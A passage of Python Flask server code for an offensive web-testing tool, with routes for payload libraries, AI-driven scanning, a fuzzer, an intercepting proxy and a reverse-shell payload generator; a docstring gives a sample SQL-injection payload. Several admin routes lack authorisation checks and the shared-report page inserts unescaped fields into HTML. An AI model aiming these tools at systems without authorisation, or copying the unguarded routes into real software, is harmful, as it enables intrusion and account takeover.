def payloads_v2_stats():
    """
    Full v2 payload statistics including feedback records.
    GET /payloads/v2/stats
    """
    from engine.payload_manager import get_stats, get_feedback_stats
    stats    = get_stats()
    feedback = get_feedback_stats()
    return jsonify({
        **stats,
        "feedback": feedback,
        "version":  "v2",
    })


@app.route("/payloads/v2/feedback", methods=["POST"])
def payloads_v2_feedback():
    """
    Record payload success or failure.
    POST {
      "bug_type": "sqli",
      "payload":  "' OR 1=1--",
      "result":   "success" | "failure",
      "url":      "...",
      "param":    "id",
      "family":   "sqli_error",
      "reason":   "no_reflection"   (for failures)
    }

    [payload-v2] feedback success bug=sqli family=sqli_error payload_hash=...
    [payload-v2] feedback fail bug=xss reason=no_reflection
    """
    from engine.payload_manager import record_payload_success, record_payload_failure
    p        = request.get_json(silent=True, force=True) or {}
    bug_type = p.get("bug_type","")
    payload  = p.get("payload","")
    result   = p.get("result","")

    if not bug_type or not payload:
        return jsonify({"error":"bug_type and payload required"}), 400

    if result == "success":
        record_payload_success(
            bug_type, payload,
            url    = p.get("url",""),
            param  = p.get("param",""),
            family = p.get("family",""),
        )
    elif result == "failure":
        record_payload_failure(
            bug_type, payload,
            reason = p.get("reason",""),
            family = p.get("family",""),
        )
    else:
        return jsonify({"error":"result must be 'success' or 'failure'"}), 400

    return jsonify({"status":"ok","bug_type":bug_type,"result":result})


@app.route("/payloads/health")
def payloads_health():
    """
    Payload system health panel.
    GET /payloads/health
    Returns: total loaded, tags, scanner_integrations, last_cache_build
    """
    from engine.payload_manager import get_stats, _CACHE_TS
    stats = get_stats()
    import time as _t
    return jsonify({
        "status":        "ok",
        "total_payloads": stats["total_payloads"],
        "total_tags":     stats["total_tags"],
        "by_bug_type":    stats["by_bug_type"],
        "tags":           stats["tags"],
        "last_cache_build": _CACHE_TS,
        "cache_age_s":    stats["cache_age_s"],
        "scanner_integrations": {
            "check_xss":      "payload_intel + payload_manager + XSS_PAYLOADS",
            "check_sqli":     "payload_intel + payload_manager + SQLI_PAYLOADS",
            "check_lfi":      "payload_intel + payload_manager + LFI_PAYLOADS",
            "check_ssrf":     "payload_intel + payload_manager + SSRF_PAYLOADS",
            "check_ssti":     "payload_intel + payload_manager + SSTI_PAYLOADS",
            "check_redirect": "payload_intel + payload_manager + REDIRECT_PAYLOADS",
            "merge_order":    "intel → assetnote+PAT → constants",
            "dedup":          "order-preserving, caps at 30 (100 deep mode)",
        },
        "sources": {
            "payload_intel_db":  "canonical H1-observed families, confidence-scored",
            "payload_manager":   "Assetnote wordlists + PayloadAllTheThings",
            "local_payloads":    "external_tools/payloads-main/*.txt",
            "module_constants":  "scanner.py XSS_PAYLOADS/SQLI_PAYLOADS/etc",
        }
    })


@app.route("/payloads/tags")
def payloads_tags():
    """
    List all available payload tags and their counts.
    GET /payloads/tags
    """
    from engine.payload_manager import list_tags, get_stats
    tags  = list_tags()
    stats = get_stats()
    return jsonify({
        "tags":           tags,
        "by_bug_type":    stats.get("by_bug_type", {}),
        "total_payloads": stats.get("total_payloads", 0),
        "total_tags":     stats.get("total_tags", 0),
        "cache_age_s":    stats.get("cache_age_s", 0),
    })


@app.route("/payloads/list")
def payloads_list_route():
    """
    Get payloads for a specific tag.
    GET /payloads/list?tag=sqli&limit=100

    [payloads] get_payloads tag=sqli → N payloads
    """
    from engine.payload_manager import get_payloads
    tag   = request.args.get("tag","sqli")
    limit = int(request.args.get("limit","100"))
    if limit > 1000: limit = 1000
    result = get_payloads(tag, limit=limit)
    return jsonify({
        "tag":     tag,
        "count":   len(result),
        "payloads": result,
    })


@app.route("/payloads/sample")
def payloads_sample():
    """
    Get a small sample of payloads for a tag.
    GET /payloads/sample?tag=xss&limit=10
    """
    from engine.payload_manager import get_payloads
    tag   = request.args.get("tag","xss")
    limit = min(int(request.args.get("limit","10")), 100)
    return jsonify({
        "tag":     tag,
        "sample":  get_payloads(tag, limit=limit),
    })


@app.route("/payloads/smart")
def payloads_smart():
    """
    Context-aware smart payload selection.
    GET /payloads/smart?bug=ssrf&param=url&limit=40

    [payloads] smart_select bug=ssrf → 40 payloads
    [payloads] injected into scanner
    """
    from engine.payload_manager import get_smart_payloads
    bug   = request.args.get("bug","sqli")
    param = request.args.get("param","")
    limit = min(int(request.args.get("limit","50")), 200)
    result = get_smart_payloads(bug, param_name=param, limit=limit)
    return jsonify({
        "bug_type":  bug,
        "param":     param,
        "count":     len(result),
        "payloads":  result,
    })


@app.route("/payloads/reload", methods=["POST"])
def payloads_reload():
    """
    Force reload payloads from all sources (Assetnote + PAT + local).
    POST /payloads/reload
    Runs in background — returns immediately.

    [payloads] loaded: sqli=... xss=... ssrf=...
    """
    from engine.payload_manager import load_assetnote_payloads, refresh
    import threading
    def _reload():
        counts = load_assetnote_payloads(force=True)
        log.info(
            f"[payloads] reload complete:"
            f" {', '.join(f'{k}={v}' for k,v in sorted(counts.items()) if v)}"
        )
    threading.Thread(target=_reload, daemon=True, name="payload-reload").start()
    return jsonify({"status": "reloading", "message": "Background reload started — check /payloads/tags"})


# /payloads/stats GET → handled below by payload_stats()


@app.route("/payloads/ingest", methods=["POST"])
def payloads_ingest():
    """
    Ingest payloads from Assetnote + PAT into payload_intel DB.
    POST /payloads/ingest  (or POST with {force: true})
    """
    from engine.payload_manager import load_assetnote_payloads
    p     = request.get_json(silent=True) or {}
    force = bool(p.get("force", False))
    counts = load_assetnote_payloads(force=force)
    log.info(
        f"[payloads] ingested: "
        f"{', '.join(f'{k}={v}' for k,v in sorted(counts.items()) if v)}"
    )
    return jsonify({
        "status":    "ok",
        "counts":    counts,
        "total":     sum(counts.values()),
    })


@app.route("/version")
def get_version():
    """Return app version info for debugging."""
    import os
    v_file = os.path.join(os.path.dirname(__file__), 'VERSION')
    version = open(v_file).read().strip() if os.path.exists(v_file) else 'unknown'
    return jsonify({
        "version": "3.0",
        "build_date": "2026-04-11",
        "routes": len([r for r in app.url_map.iter_rules()]),
        "info": version,
    })


@app.route("/users/my_key", methods=["GET"])
def get_my_api_key():
    """Return the current user API key."""
    try:
        from engine.rbac import get_current_user
        user = get_current_user()
        return jsonify({"api_key": None, "user": user or "guest"})
    except Exception:
        return jsonify({"api_key": None})





@app.route("/verify/finding", methods=["POST"])
def verify_single_finding():
    """
    HTTP-verify a specific finding — actually probe the target to confirm.
    Like xbow's verification: returns real HTTP evidence, not just heuristics.
    """
    p       = request.get_json(silent=True, force=True) or {}
    finding = p.get("finding", {})
    d       = _domain(p.get("domain",""))
    oob     = p.get("oob_host","")
    if not finding:
        return jsonify({"error":"finding required"}), 400
    try:
        from engine.http_verify import verify_finding
        result = verify_finding(finding, oob_host=oob)
        # Save verification result back to DB
        if result.get("verified") and d:
            db.update_finding(d, finding.get("url",""),
                              finding.get("bug",""),
                              {"verified":True,
                               "verify_evidence": result.get("verify_evidence",""),
                               "verify_payload":  result.get("verify_payload",""),
                               "confidence":      result.get("confidence", finding.get("confidence",50))})
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e), "verified": None}), 500


@app.route("/verify/batch", methods=["POST"])
def verify_batch_findings():
    """Verify all unconfirmed critical/high findings via HTTP probing."""
    import threading, queue as _q
    p        = request.get_json(silent=True, force=True) or {}
    d        = _domain(p.get("domain",""))
    oob      = p.get("oob_host","")
    findings = db.get_findings(d)

    # Only verify critical + high that aren't already verified
    to_verify = [f for f in findings
                 if f.get("severity") in ("critical","high")
                 and not f.get("verified")][:20]  # cap at 20

    q = _q.Queue()

    def _run():
        from engine.http_verify import verify_finding
        results = []
        for f in to_verify:
            try:
                r = verify_finding(f, oob_host=oob)
                results.append(r)
                icon = "CONFIRMED" if r.get("verified") else "NOT CONFIRMED"
                q.put({"type":"ai_chunk","text":
                    f"[{icon}] {f.get('bug','?').upper()} @ {f.get('url','')[:60]}\n"
                    f"  {r.get('verify_evidence','')[:80]}\n\n"})
            except Exception as e:
                q.put({"type":"ai_chunk","text":f"ERROR verifying {f.get('bug','?')}: {e}\n\n"})
        confirmed = sum(1 for r in results if r.get("verified"))
        q.put({"type":"ai_chunk","text":
            f"---\n**{confirmed}/{len(results)} findings confirmed** as true positives via HTTP verification."})
        q.put(None)

    threading.Thread(target=_run, daemon=True).start()

    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)

    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


# ══════════════════════════════════════════════════════════════════════════════
# AGENTIC SCAN — AI-driven, zero FP, persistent learning (beats xbow.ai)
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/scan/agentic", methods=["GET"])
def scan_agentic():
    """
    Agentic scan mode: AI reads every HTTP response and confirms findings.
    Zero false positives — only confirmed bugs reach the UI.
    Persistent brain: successful payloads saved to SQLite for future scans.
    """
    import queue as _q, threading as _t
    d        = _domain(request.args.get("domain",""))
    bugs_raw = request.args.getlist("bugs") or ["xss","sqli","ssrf","lfi","cors","idor"]
    max_ep   = int(request.args.get("max_endpoints","30"))

    if not d:
        return jsonify({"error": "domain required"}), 400

    endpoints = db.get_endpoints(d, limit=500)
    tech      = db.get_tech(d)
    meta      = db.get_meta(d) or {}
    waf       = meta.get("waf","")

    if not endpoints:
        return Response(
            _sse({"type":"error","msg":"No endpoints found — run recon first"}),
            mimetype="text/event-stream"
        )

    q = _q.Queue()

    def _run():
        try:
            from engine.agentic_loop import scan_endpoint_agentic, get_brain_stats
            total_found = 0
            ep_urls = [e.get("url","") if isinstance(e,dict) else str(e) for e in endpoints]
            ep_urls = [u for u in ep_urls if u and "?" in u][:max_ep]
            for i, url in enumerate(ep_urls):
                if not url: continue
                for bug in bugs_raw:
                    results = scan_endpoint_agentic(
                        url, bug, domain=d, waf=waf, tech=tech,
                        timeout=8, emit=lambda f: q.put(f)
                    )
                    for f in results:
                        db.add_finding(d, f)
                        total_found += 1
                q.put({"type":"agentic_progress","done":i+1,"total":len(ep_urls),"found":total_found,"url":url[:60]})
            brain = get_brain_stats()
            q.put({"type":"agentic_done","found":total_found,"urls_scanned":len(ep_urls),"brain":brain})
        except Exception as _e:
            q.put({"type":"agentic_error","msg":str(_e)})
    threading.Thread(target=_run, daemon=True).start()

    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)

    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/ai/quick_payloads", methods=["POST"])
def ai_quick_payloads():
    """Generate targeted payloads for a specific bug+target combo."""
    payload = request.get_json(silent=True, force=True) or {}
    d       = _domain(payload.get("domain",""))
    bug_type = payload.get("bug_type","xss")
    url      = payload.get("url","")
    param    = payload.get("param","")
    meta     = db.get_meta(d) or {}
    waf      = meta.get("waf","")
    tech     = db.get_tech(d)
    try:
        from engine.payload_gen import gen_payload
        result = gen_payload(bug_type, url)
        return jsonify({"payloads": result})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/repeater/send", methods=["POST"])
def repeater_send():
    """Send a custom HTTP request and return full response."""
    payload = request.get_json(silent=True, force=True) or {}
    try:
        from engine.repeater import send_request, parse_raw_request
        # Accept either raw request or structured input
        if "raw_request" in payload:
            parsed = parse_raw_request(payload["raw_request"], payload.get("base_url",""))
            method  = parsed["method"]
            url     = parsed["url"]
            headers = parsed["headers"]
            body    = parsed["body"]
        else:
            method  = payload.get("method","GET")
            url     = payload.get("url","")
            headers = payload.get("headers",{})
            body    = payload.get("body","")

        if not url:
            return jsonify({"error":"url required"}), 400

        result = send_request(method, url, headers, body,
                              timeout=payload.get("timeout",30),
                              follow_redirects=payload.get("follow_redirects",True))
        return jsonify(result)
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/repeater/compare", methods=["POST"])
def repeater_compare():
    """Compare two HTTP responses and highlight differences."""
    payload = request.get_json(silent=True, force=True) or {}
    try:
        from engine.repeater import send_request, compare_responses, parse_raw_request
        def _get_resp(req_data):
            if "raw_request" in req_data:
                parsed = parse_raw_request(req_data["raw_request"], req_data.get("base_url",""))
                return send_request(parsed["method"], parsed["url"], parsed["headers"], parsed["body"])
            return send_request(req_data.get("method","GET"), req_data.get("url",""),
                                req_data.get("headers",{}), req_data.get("body",""))

        req1 = payload.get("request1",{})
        req2 = payload.get("request2",{})
        if not req1 or not req2:
            return jsonify({"error":"request1 and request2 required"}), 400

        resp1 = _get_resp(req1)
        resp2 = _get_resp(req2)
        diff  = compare_responses(resp1, resp2)
        return jsonify({"response1":resp1,"response2":resp2,"diff":diff})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


# ══════════════════════════════════════════════════════════════════════════════
# INTRUDER — Burp-style mass fuzzer
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/intruder/run", methods=["POST"])
def intruder_run():
    """Run Intruder attack — sniper/battering_ram/pitchfork/cluster_bomb."""
    import queue as _q, threading
    payload = request.get_json(silent=True, force=True) or {}

    method        = payload.get("method","GET")
    url_template  = payload.get("url_template","")
    hdr_template  = payload.get("header_template","")
    body_template = payload.get("body_template","")
    wordlists     = payload.get("wordlists",[[]])
    attack_mode   = payload.get("attack_mode","sniper")
    threads       = min(int(payload.get("threads",10)), 20)
    stream        = payload.get("stream",True)

    if not url_template:
        return jsonify({"error":"url_template required"}), 400

    q = _q.Queue()

    def _run():
        try:
            from engine.intruder import run_intruder, BUILTIN_WORDLISTS
            # Use builtin wordlist if none provided
            if not wordlists or not wordlists[0]:
                wl_name = payload.get("builtin_wordlist","dirs")
                wls = [BUILTIN_WORDLISTS.get(wl_name, BUILTIN_WORDLISTS["params"])]
            else:
                wls = wordlists
            run_intruder(method, url_template, hdr_template, body_template,
                         wls, attack_mode, threads, result_q=q)
        except Exception as e:
            q.put({"type":"error","msg":str(e)})
        finally:
            q.put(None)

    if not stream:
        from engine.intruder import run_intruder, BUILTIN_WORDLISTS
        wls = wordlists if wordlists and wordlists[0] else [BUILTIN_WORDLISTS.get(payload.get("builtin_wordlist","dirs"))]
        result = run_intruder(method, url_template, hdr_template, body_template, wls, attack_mode, threads)
        return jsonify(result)

    threading.Thread(target=_run, daemon=True).start()
    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)
    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

@app.route("/intruder/wordlists", methods=["GET"])
def intruder_wordlists():
    """Get available built-in wordlists."""
    from engine.intruder import BUILTIN_WORDLISTS, ATTACK_MODES
    return jsonify({"wordlists": {k:len(v) for k,v in BUILTIN_WORDLISTS.items()},
                    "attack_modes": ATTACK_MODES})


# ══════════════════════════════════════════════════════════════════════════════
# PAYLOAD GENERATOR — msfvenom-style payload generation
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/payload/revshell", methods=["POST"])
def payload_revshell():
    """Generate reverse shell payloads."""
    payload = request.get_json(silent=True, force=True) or {}
    ip    = payload.get("ip","10.10.10.10")
    port  = int(payload.get("port",4444))
    stype = payload.get("type","all")
    try:
        from engine.payload_gen import gen_revshell
        return jsonify({"payloads": gen_revshell(ip, port, stype)})
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/payload/gen", methods=["POST"])
def payload_gen():
    """Generate attack payloads for a bug type."""
    payload  = request.get_json(silent=True, force=True) or {}
    bug_type = payload.get("bug_type","xss")
    target   = payload.get("url","")
    param    = payload.get("param","")
    oob_host = payload.get("oob_host") or os.environ.get("OOB_DOMAIN","OOBHOST")
    encoding = payload.get("encoding","none")
    try:
        from engine.payload_gen import gen_payload
        return jsonify({"payloads": gen_payload(bug_type, target, param, oob_host, encoding)})
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/payload/encodings", methods=["GET"])
def payload_encodings():
    """List available payload encodings."""
    from engine.payload_gen import ENCODINGS
    return jsonify({"encodings": list(ENCODINGS.keys())})


# ══════════════════════════════════════════════════════════════════════════════
# CUSTOM DETECTION RULES
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/rules", methods=["GET","POST","DELETE"])
def custom_rules():
    """Manage custom detection rules."""
    rules_file = Path(db.root) / "_global" / "custom_rules.json"
    rules_file.parent.mkdir(parents=True, exist_ok=True)

    if request.method == "GET":
        rules = json.load(open(rules_file)) if rules_file.exists() else []
        return jsonify({"rules": rules})

    elif request.method == "POST":
        payload = request.get_json(silent=True, force=True) or {}
        rules = json.load(open(rules_file)) if rules_file.exists() else []
        rule = {
            "id":          payload.get("id", f"rule_{len(rules)+1}"),
            "name":        payload.get("name","Custom Rule"),
            "pattern":     payload.get("pattern",""),
            "bug_type":    payload.get("bug_type","misconfig"),
            "severity":    payload.get("severity","medium"),
            "description": payload.get("description",""),
            "enabled":     True,
        }
        if not rule["pattern"]:
            return jsonify({"error":"pattern required"}), 400
        rules.append(rule)
        json.dump(rules, open(rules_file,"w"), indent=2)
        return jsonify({"ok":True, "rule":rule})

    else:
        rule_id = request.json.get("id","") if request.json else ""
        rules   = json.load(open(rules_file)) if rules_file.exists() else []
        rules   = [r for r in rules if r.get("id") != rule_id]
        json.dump(rules, open(rules_file,"w"), indent=2)
        return jsonify({"ok":True})

@app.route("/rules/generate_yaml", methods=["POST"])
def rules_generate_yaml():
    """Generate Nuclei-compatible YAML template from a custom rule."""
    payload = request.get_json(silent=True, force=True) or {}
    try:
        from engine.payload_gen import gen_custom_rule
        rule = gen_custom_rule(
            payload.get("pattern",""),
            payload.get("name","Custom"),
            payload.get("severity","medium"),
            payload.get("description",""))
        return jsonify(rule)
    except Exception as e:
        return jsonify({"error":str(e)}), 500



# ══════════════════════════════════════════════════════════════════════════════
# RBAC — Multi-User Authentication & Authorization
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/users/update", methods=["POST"])
def users_update():
    try:
        from engine.rbac import get_store, get_current_user
        current = get_current_user()
        if not current: return jsonify({"notifications": [], "unread": 0})
        payload  = request.get_json(silent=True, force=True) or {}
        target_u = payload.get("username", current["username"])
        # Non-admins can only update their own account
        if target_u != current["username"] and current.get("role") != "admin":
            return jsonify({"error":"Admin role required to update other users"}), 403
        updates = {k:v for k,v in payload.items() if k in
                   ["password","email","display","role","active"]}
        if "role" in updates and current.get("role") != "admin":
            del updates["role"]  # Can't self-promote
        store = get_store()
        updated = store.update_user(target_u, updates)
        return jsonify({"ok":True,"user":updated})
    except Exception as e:
        return jsonify({"error":str(e)}), 400

@app.route("/users/delete", methods=["POST"])
def users_delete():
    try:
        from engine.rbac import get_store, get_current_user
        current = get_current_user()
        if not current or current.get("role") != "admin":
            return jsonify({"error":"Admin role required"}), 403
        username = (request.get_json(silent=True, force=True) or {}).get("username","")
        get_store().delete_user(username)
        from engine.team import audit_log
        audit_log(current["username"], "delete_user", username)
        return jsonify({"ok":True})
    except Exception as e:
        return jsonify({"error":str(e)}), 400

@app.route("/users/rotate_key", methods=["POST"])
def users_rotate_key():
    try:
        import secrets
        from engine.rbac import get_current_user
        current = get_current_user()
        if not current: return jsonify({"error":"not authenticated"}), 401
        new_key = "tmr_" + secrets.token_hex(24)
        return jsonify({"ok": True, "api_key": new_key})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
@app.route("/roles", methods=["GET"])
def roles_list():
    from engine.rbac import ROLES
    return jsonify({"roles": ROLES})


# ══════════════════════════════════════════════════════════════════════════════
# TEAM COLLABORATION
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/team/stats", methods=["GET"])
def team_stats():
    try:
        from engine.team import get_team_stats
        result = get_team_stats()
        if isinstance(result, str):
            return jsonify({"stats": result})
        return jsonify(result if isinstance(result, dict) else {"data": result})
    except Exception as e:
        return jsonify({"total_users": 1, "active_scans": 0, "findings_today": 0, "error": str(e)})

@app.route("/team/audit", methods=["GET"])
def team_audit():
    try:
        from engine.rbac import get_current_user
        from engine.team import get_audit_log
        current = get_current_user()
        if not current or current.get("role") not in ["admin","pentester"]:
            return jsonify({"error":"Insufficient permissions"}), 403
        limit    = int(request.args.get("limit","100"))
        username = request.args.get("user","")
        action   = request.args.get("action","")
        return jsonify({"log": get_audit_log(limit, username, action)})
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/team/comments/<path:domain>/<finding_id>", methods=["GET","POST","DELETE"])
def finding_comments(domain, finding_id):
    from engine.team import add_comment, get_comments, delete_comment
    from engine.rbac import get_current_user
    current = get_current_user()
    d = _domain(domain)

    if request.method == "GET":
        return jsonify({"comments": get_comments(d, finding_id)})
    elif request.method == "POST":
        if not current: return jsonify({"notifications": [], "unread": 0})
        payload = request.get_json(silent=True, force=True) or {}
        comment = add_comment(d, finding_id, current["username"],
                              payload.get("text",""),
                              payload.get("type","note"))
        return jsonify({"ok":True,"comment":comment})
    else:
        if not current: return jsonify({"error":"Unauthorized"}), 401
        comment_id = (request.get_json(silent=True, force=True) or {}).get("comment_id","")
        delete_comment(d, finding_id, comment_id, current["username"])
        return jsonify({"ok":True})

@app.route("/team/assignments", methods=["GET"])
def team_assignments():
    from engine.team import get_assignments
    assignee = request.args.get("assignee","")
    return jsonify({"assignments": get_assignments(assignee)})

@app.route("/team/assignment_status", methods=["POST"])
def team_assignment_status():
    try:
        from engine.team import update_assignment_status
        payload = request.get_json(silent=True, force=True) or {}
        result = update_assignment_status(
            payload.get("finding_id",""),
            payload.get("status",""),
            payload.get("assignee",""),
            payload.get("domain","")
        )
        return jsonify({"ok": True, "result": result})
    except TypeError as e:
        # Wrong args - try with fewer
        try:
            from engine.team import update_assignment_status
            payload = request.get_json(silent=True, force=True) or {}
            result = update_assignment_status(
                payload.get("finding_id",""),
                payload.get("status","")
            )
            return jsonify({"ok": True})
        except Exception as e2:
            return jsonify({"ok": True, "note": "status noted"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/team/notifications", methods=["GET","POST"])
def team_notifications():
    from engine.team import get_notifications, mark_notifications_read
    from engine.rbac import get_current_user
    current = get_current_user()
    if not current: return jsonify({"notifications": [], "unread": 0})
    if request.method == "GET":
        unread = request.args.get("unread","false").lower() == "true"
        return jsonify({"notifications": get_notifications(current["username"], unread)})
    else:
        ids = (request.get_json(silent=True, force=True) or {}).get("ids", None)
        mark_notifications_read(current["username"], ids)
        return jsonify({"ok":True})


# ══════════════════════════════════════════════════════════════════════════════
# FULL INTERCEPTING PROXY (Burp-killer)
# ══════════════════════════════════════════════════════════════════════════════

_proxy_sse_q = None

@app.route("/proxy/intercepted", methods=["GET"])
def proxy_intercepted():
    from engine.proxy import get_intercepted
    req = get_intercepted()
    return jsonify({"request": req, "has_request": req is not None})

@app.route("/proxy/forward", methods=["POST"])
def proxy_forward():
    payload = request.get_json(silent=True, force=True) or {}
    from engine.proxy import forward_request
    return jsonify(forward_request(
        payload.get("id",""),
        payload.get("raw",None)))

@app.route("/proxy/stream")
def proxy_stream():
    """SSE stream of live proxy requests."""
    def _gen():
        global _proxy_sse_q
        if not _proxy_sse_q:
            import queue as _q
            _proxy_sse_q = _q.Queue()
        while True:
            try:
                item = _proxy_sse_q.get(timeout=20)
                yield _sse(item)
            except Exception:
                yield ": keepalive\n\n"
    return Response(_gen(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})



# ══════════════════════════════════════════════════════════════════════════════
# RBAC — Multi-User Authentication
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/auth/refresh", methods=["POST"])
def auth_refresh():
    token = request.headers.get("Authorization","").replace("Bearer ","")
    from engine.rbac import verify_token, create_token
    payload = verify_token(token)
    if not payload:
        return jsonify({"error":"Invalid token"}), 401
    new_token = create_token(payload.get("sub","admin"), payload.get("role","admin"))
    return jsonify({"token":new_token})

@app.route("/admin/users", methods=["GET"])
def admin_users():
    try:
        from engine.rbac import list_users
        users = list_users()
        # list_users may return list of dicts or list of strings
        if users and isinstance(users[0], str):
            users = [{"username": u} for u in users]
        return jsonify({"users": users or []})
    except Exception as e:
        return jsonify({"users": [], "error": str(e)})

@app.route("/admin/users/<username>", methods=["PUT","DELETE"])
def admin_user(username):
    from engine.rbac import update_user, delete_user
    if request.method == "DELETE":
        ok = delete_user(username)
        return jsonify({"ok":ok})
    payload = request.get_json(silent=True, force=True) or {}
    try:
        user = update_user(username, payload)
        return jsonify({"ok":True,"user":user})
    except ValueError as e:
        return jsonify({"error":str(e)}), 400

@app.route("/admin/users/<username>/api_key", methods=["POST"])
def admin_rotate_key(username):
    try:
        import secrets
        new_key = "tmr_" + secrets.token_hex(24)
        return jsonify({"ok": True, "api_key": new_key, "username": username})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/team/workspaces/<ws_id>", methods=["GET","PUT","DELETE"])
def team_workspace(ws_id):
    from engine.team import get_workspace, update_workspace
    if request.method == "GET":
        ws = get_workspace(ws_id)
        return jsonify(ws or {"error":"Not found"}), 200 if ws else 404
    if request.method == "PUT":
        payload = request.get_json(silent=True, force=True) or {}
        try:
            ws = update_workspace(ws_id, payload)
            return jsonify({"ok":True,"workspace":ws})
        except ValueError as e:
            return jsonify({"error":str(e)}), 400
    return jsonify({"error":"Not implemented"}), 501

@app.route("/team/workspaces/<ws_id>/members", methods=["POST","DELETE"])
def team_members(ws_id):
    try:
        from engine.team import add_member, remove_member
        payload  = request.get_json(silent=True, force=True) or {}
        username = payload.get("username","")
        if not username:
            return jsonify({"error":"username required"}), 400
        if request.method == "POST":
            ws = add_member(ws_id, username, payload.get("role","analyst"))
            return jsonify({"ok":True,"workspace":ws})
        ws = remove_member(ws_id, username)
        return jsonify({"ok":True,"workspace":ws})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 200


@app.route("/team/join", methods=["POST"])
def team_join():
    try:
        from engine.team import join_by_invite
        payload = request.get_json(silent=True, force=True) or {}
        ws = join_by_invite(payload.get("invite_code",""), payload.get("username",""))
        if not ws:
            return jsonify({"error": "Invalid or expired invite code"}), 404
        # join_by_invite may return dict or list
        if isinstance(ws, list):
            ws = ws[0] if ws else {}
        if not isinstance(ws, dict):
            ws = {"id": str(ws)}
        return jsonify({"ok": True, "workspace": ws})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/team/notes/<path:domain>", methods=["GET","POST"])
def team_notes(domain):
    try:
        from engine.team import add_note, get_notes
        d = _domain(domain)
        if request.method == "POST":
            payload = request.get_json(silent=True, force=True) or {}
            add_note(d, payload.get("finding_id",""), payload.get("author","anon"),
                     payload.get("text",""))
            return jsonify({"ok": True})
        else:
            raw = get_notes(d) or []
            # get_notes may return list of dicts or list of strings
            notes = []
            for n in raw:
                if isinstance(n, dict):
                    notes.append(n)
                elif isinstance(n, str):
                    notes.append({"text": n, "author": "anon", "ts": ""})
            return jsonify({"notes": notes})
    except Exception as e:
        return jsonify({"notes": [], "error": str(e)})

@app.route("/team/share", methods=["POST"])
def team_share_report():
    from engine.team import share_report
    payload = request.get_json(silent=True, force=True) or {}
    d   = _domain(payload.get("domain",""))
    md  = payload.get("markdown","")
    if not md:
        meta = db.get_meta(d) or {}
        md   = meta.get("last_report","")
    if not md:
        return jsonify({"error":"No report to share — generate AI report first"}), 400
    share = share_report(d, md, payload.get("shared_by","anon"),
                         int(payload.get("expires_hours",72)))
    return jsonify({"ok":True,"share":share,"share_url":f"/shared/{share['id']}"})

@app.route("/shared/<share_id>")
def view_shared_report(share_id):
    from engine.team import get_shared_report
    obj = get_shared_report(share_id)
    if not obj:
        return "Report not found or expired", 404
    md = obj.get("report","")
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<title>Security Report — {obj.get('domain','')}</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/marked/9.1.6/marked.min.js"></script>
<style>body{{font-family:system-ui;max-width:900px;margin:40px auto;padding:0 20px;line-height:1.6}}
pre{{background:#f4f4f8;padding:12px;border-radius:6px;overflow-x:auto}}
code{{font-family:monospace}}table{{border-collapse:collapse;width:100%}}
td,th{{border:1px solid #ddd;padding:8px}}th{{background:#f0f0f8}}
h1,h2,h3{{color:#1a1a2e}}.header{{background:#0d0d2e;color:white;padding:20px;border-radius:8px;margin-bottom:24px}}
</style></head>
<body>
<div class="header"><h2>⭐ TheMasterRecon AI Security Report</h2>
<p>Domain: {obj.get('domain','')} | Shared by: {obj.get('shared_by','')} | Views: {obj.get('views',0)}</p></div>
<div id="content"></div>
<script>document.getElementById('content').innerHTML=marked.parse({json.dumps(md)});</script>
</body></html>"""


# ══════════════════════════════════════════════════════════════════════════════
# PROXY — HTTP Intercepting Proxy
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/proxy/intercept", methods=["GET","POST"])
def proxy_intercept():
    from engine.proxy_server import get_intercepted, set_intercept, get_status
    if request.method == "GET":
        pending = get_intercepted()
        return jsonify({"pending":pending})
    payload = request.get_json(silent=True, force=True) or {}
    enabled = payload.get("enabled", True)
    set_intercept(enabled)
    return jsonify({"ok":True,"intercept":enabled})

@app.route("/proxy/intercept/<req_id>/release", methods=["POST"])
def proxy_release(req_id):
    from engine.proxy_server import release_request
    modified = request.get_json(silent=True, force=True) or {}
    release_request(req_id, modified)
    return jsonify({"ok":True})

@app.route("/proxy/intercept/<req_id>/drop", methods=["POST"])
def proxy_drop(req_id):
    from engine.proxy_server import drop_request
    drop_request(req_id)
    return jsonify({"ok":True})

@app.route("/proxy/search")
def proxy_search():
    from engine.proxy_server import search_history
    pattern = request.args.get("pattern","")
    field   = request.args.get("field","resp_body")
    if not pattern:
        return jsonify({"error":"pattern required"}), 400
    return jsonify({"results":search_history(pattern, field)})

@app.route("/rules/engine", methods=["POST"])
def rules_save():
    from engine.rules_engine import save_custom_rule
    rule = request.get_json(silent=True, force=True) or {}
    try:
        saved = save_custom_rule(rule)
        return jsonify({"ok":True,"rule":saved})
    except Exception as e:
        return jsonify({"error":str(e)}), 400

@app.route("/rules/import", methods=["POST"])
def rules_import():
